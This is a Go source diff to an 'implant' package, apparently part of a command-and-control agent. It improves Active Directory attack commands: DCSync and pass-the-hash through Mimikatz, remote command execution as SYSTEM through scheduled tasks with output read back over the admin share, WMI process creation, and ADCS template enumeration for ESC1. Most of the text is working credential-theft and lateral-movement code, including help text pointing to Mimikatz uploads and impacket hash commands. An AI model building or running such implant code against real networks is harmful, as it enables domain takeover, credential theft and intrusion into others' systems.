@@ -3,6 +3,8 @@ package implant
 import (
 	"fmt"
 	"os"
+	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strings"
 )
@@ -275,12 +277,42 @@ func adASREPRoast(args []string) ([]byte, error) {
 	return ExecuteShell([]string{"echo 'AS-REP Roasting on Linux requires impacket: GetNPUsers.py'"})
 }
 
+// findOnHost locates a named executable on the agent host: first via PATH,
+// then the current working directory. Returns "" when not present.
+func findOnHost(name string) string {
+	if p, err := exec.LookPath(name); err == nil {
+		return p
+	}
+	if wd, err := os.Getwd(); err == nil {
+		candidate := filepath.Join(wd, name)
+		if _, err := os.Stat(candidate); err == nil {
+			return candidate
+		}
+	}
+	return ""
+}
+
 func adDCSync(args []string) ([]byte, error) {
 	if len(args) == 0 {
-		return []byte("Usage: ad-dcsync <DOMAIN/user>\nExample: ad-dcsync CORP/krbtgt\nRequires Domain Admin or Replication rights"), nil
+		return []byte("Usage: ad-dcsync <DOMAIN/user>\nExample: ad-dcsync DIGITALSHIELD/krbtgt\nRequires Domain Admin or Replication rights"), nil
 	}
 	if runtime.GOOS == "windows" {
-		return ExecuteShell([]string{fmt.Sprintf(`mimikatz.exe "lsadump::dcsync /user:%s" exit`, args[0])})
+		// DCSync is performed by Mimikatz. Fail with actionable guidance
+		// instead of a cryptic "not recognized as a command" error.
+		mkPath := findOnHost("mimikatz.exe")
+		if mkPath == "" {
+			return []byte(fmt.Sprintf(
+				"[!] mimikatz.exe was not found on the agent host.\n"+
+					"[*] DCSync requires Mimikatz (or equivalent). Options:\n"+
+					"  1. Upload mimikatz.exe first, then run:\n"+
+					"       upload mimikatz.exe\n"+
+					"       ad-dcsync %s\n"+
+					"  2. From Kali, use impacket instead:\n"+
+					"       impacket-secretsdump -just-dc-user %s '<DOMAIN>/<user>:<pass>@<DC-IP>'\n"+
+					"[*] Local hive dumps remain available via ad-dump-sam / ad-dump-lsa.",
+				args[0], args[0])), nil
+		}
+		return ExecuteShell([]string{fmt.Sprintf(`"%s" "lsadump::dcsync /user:%s" exit`, mkPath, args[0])})
 	}
 	return []byte("DCSync on Linux requires impacket: secretsdump.py -just-dc-user " + args[0]), nil
 }
@@ -315,7 +347,11 @@ func adPsExec(args []string) ([]byte, error) {
 		return []byte("Usage: ad-psexec <target> <command>\nExample: ad-psexec 10.0.0.5 whoami"), nil
 	}
 	if runtime.GOOS == "windows" {
-		return ExecuteShell([]string{fmt.Sprintf(`psexec.exe \\%s -accepteula %s`, args[0], strings.Join(args[1:], " "))})
+		// Native PsExec-style remote execution without psexec.exe: create a
+		// scheduled task on the target (SYSTEM), run it, and read stdout back
+		// via the target's admin share. Requires admin rights on the target.
+		ps := fmt.Sprintf(`$ErrorActionPreference='SilentlyContinue';$target='%s';$cmd='%s';$task='PhantomTask';$out="\\$target\C$\Windows\Temp\phantom_out.txt";$run="cmd.exe /c "+$cmd+" > C:\Windows\Temp\phantom_out.txt 2>&1";schtasks.exe /create /s $target /ru SYSTEM /tn $task /tr $run /sc once /st 00:00 /f | Out-Null;schtasks.exe /run /s $target /tn $task | Out-Null;Start-Sleep -Seconds 4;if(Test-Path $out){Get-Content $out}else{'[-] No output captured (task failed or target unreachable)'};schtasks.exe /delete /s $target /tn $task /f | Out-Null`, args[0], strings.Join(args[1:], " "))
+		return RunPowerShell(ps)
 	}
 	return []byte(fmt.Sprintf("PsExec on Linux: impacket-psexec 'user:pass@%s' '%s'", args[0], strings.Join(args[1:], " "))), nil
 }
@@ -325,7 +361,9 @@ func adWMI(args []string) ([]byte, error) {
 		return []byte("Usage: ad-wmi <target> <command>"), nil
 	}
 	if runtime.GOOS == "windows" {
-		return ExecuteShell([]string{fmt.Sprintf(`wmic /node:"%s" process call create "%s"`, args[0], strings.Join(args[1:], " "))})
+		// wmic is removed on Server 2022+, so use the CIM cmdlets instead.
+		ps := fmt.Sprintf(`try{$r=Invoke-CimMethod -ComputerName '%s' -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='%s'};if($r.ReturnValue -eq 0){'[+] WMI process created (PID '+$r.ProcessId+')'}else{'[-] ReturnValue '+$r.ReturnValue}}catch{'[-] WMI error: '+$_.Exception.Message}`, args[0], strings.Join(args[1:], " "))
+		return RunPowerShell(ps)
 	}
 	return []byte(fmt.Sprintf("WMI on Linux: impacket-wmiexec 'user:pass@%s' '%s'", args[0], strings.Join(args[1:], " "))), nil
 }
@@ -346,7 +384,18 @@ func adPassTheHash(args []string) ([]byte, error) {
 		return []byte("Usage: ad-pass-the-hash <target> <user> <ntlm_hash> [command]\nExample: ad-pass-the-hash 10.0.0.5 admin aad3b435b51404eeaad3b435b51404ee:hash whoami"), nil
 	}
 	if runtime.GOOS == "windows" {
-		return ExecuteShell([]string{fmt.Sprintf(`sekurlsa::pth /user:%s /ntlm:%s /run:cmd.exe`, args[1], args[2])})
+		mkPath := findOnHost("mimikatz.exe")
+		if mkPath == "" {
+			return []byte(fmt.Sprintf(
+				"[!] mimikatz.exe not found — Pass-the-Hash via the agent requires Mimikatz.\n"+
+					"[*] Upload mimikatz.exe first, then run:\n"+
+					"       ad-pass-the-hash %s %s %s\n"+
+					"[*] Or from Kali:\n"+
+					"       impacket-psexec -hashes ':%s' '%s@%s' cmd.exe\n"+
+					"       impacket-wmiexec -hashes ':%s' '%s@%s' cmd.exe",
+				args[0], args[1], args[2], args[2], args[1], args[0], args[2], args[1], args[0])), nil
+		}
+		return ExecuteShell([]string{fmt.Sprintf(`"%s" "sekurlsa::pth /user:%s /ntlm:%s /run:cmd.exe" exit`, mkPath, args[1], args[2])})
 	}
 	cmd := "whoami"
 	if len(args) > 3 {
@@ -360,34 +409,35 @@ func adPassTheHash(args []string) ([]byte, error) {
 // adADCSEnum enumerates ADCS certificate templates looking for ESC misconfigurations.
 func adADCSEnum(args []string) ([]byte, error) {
 	if runtime.GOOS == "windows" {
-		// Query LDAP for certificate templates with dangerous flags.
+		var out []byte
+		// List CAs via certutil (no PowerShell quoting involved). Avoid
+		// "certutil -config - -ping" because "-config -" can block waiting
+		// for an interactive CA selection on ADCS-enabled hosts.
+		caOut, _ := ExecuteShell([]string{`certutil -CA 2>&1`})
+		out = append(out, caOut...)
+		out = append(out, '\n')
+
+		// Enumerate templates with a PowerShell LDAP query, executed directly
+		// (not through cmd.exe) so the complex script is not mangled.
 		// msPKI-Certificate-Name-Flag bit 1 = ENROLLEE_SUPPLIES_SUBJECT (ESC1)
 		// msPKI-Enrollment-Flag bit 1 = CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS (ESC2)
-		cmds := []string{
-			// List all CAs
-			`certutil -config - -ping 2>&1 || certutil -CA 2>&1`,
-			// Enumerate templates with PowerShell LDAP query
-			`powershell -NoP -W Hidden -C "` +
-				`$root = [ADSI]'LDAP://RootDSE';` +
-				`$conf = $root.configurationNamingContext;` +
-				`$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]\"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$conf\");` +
-				`$searcher.Filter = '(objectClass=pKICertificateTemplate)';` +
-				`$searcher.PropertiesToLoad.AddRange(@('cn','msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag','pKIExtendedKeyUsage','nTSecurityDescriptor'));` +
-				`$templates = $searcher.FindAll();` +
-				`foreach($t in $templates){` +
-				`  $nameFlag = [int]$t.Properties['msPKI-Certificate-Name-Flag'][0];` +
-				`  $enrollFlag = [int]$t.Properties['msPKI-Enrollment-Flag'][0];` +
-				`  $esc1 = ($nameFlag -band 1) -ne 0;` +
-				`  $eku = $t.Properties['pKIExtendedKeyUsage'];` +
-				`  Write-Output \"Template: $($t.Properties['cn'][0])  NameFlag: $nameFlag  EnrollFlag: $enrollFlag  ESC1: $esc1  EKU: $eku\"` +
-				`}"`,
-		}
-		var out []byte
-		for _, cmd := range cmds {
-			result, _ := ExecuteShell([]string{cmd})
-			out = append(out, result...)
-			out = append(out, '\n')
-		}
+		ps := `$root = [ADSI]'LDAP://RootDSE';` +
+			`$conf = $root.configurationNamingContext;` +
+			`$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]("LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$conf"));` +
+			`$searcher.Filter = '(objectClass=pKICertificateTemplate)';` +
+			`$searcher.PropertiesToLoad.AddRange(@('cn','msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag','pKIExtendedKeyUsage'));` +
+			`$templates = $searcher.FindAll();` +
+			`if($templates.Count -eq 0){Write-Output 'No certificate templates found or no ADCS configured'}` +
+			`foreach($t in $templates){` +
+			`  $nameFlag = 0; $enrollFlag = 0;` +
+			`  if($t.Properties['msPKI-Certificate-Name-Flag']){$nameFlag = [int]$t.Properties['msPKI-Certificate-Name-Flag'][0]}` +
+			`  if($t.Properties['msPKI-Enrollment-Flag']){$enrollFlag = [int]$t.Properties['msPKI-Enrollment-Flag'][0]}` +
+			`  $esc1 = ($nameFlag -band 1) -ne 0;` +
+			`  $eku = $t.Properties['pKIExtendedKeyUsage'] -join ',';` +
+			`  Write-Output ("Template: {0}  NameFlag: {1}  EnrollFlag: {2}  ESC1: {3}  EKU: {4}" -f $t.Properties['cn'][0],$nameFlag,$enrollFlag,$esc1,$eku)` +
+			`}`
+		tplOut, _ := RunPowerShell(ps)
+		out = append(out, tplOut...)
 		return out, nil
 	}
 	// Linux: use ldapsearch if available
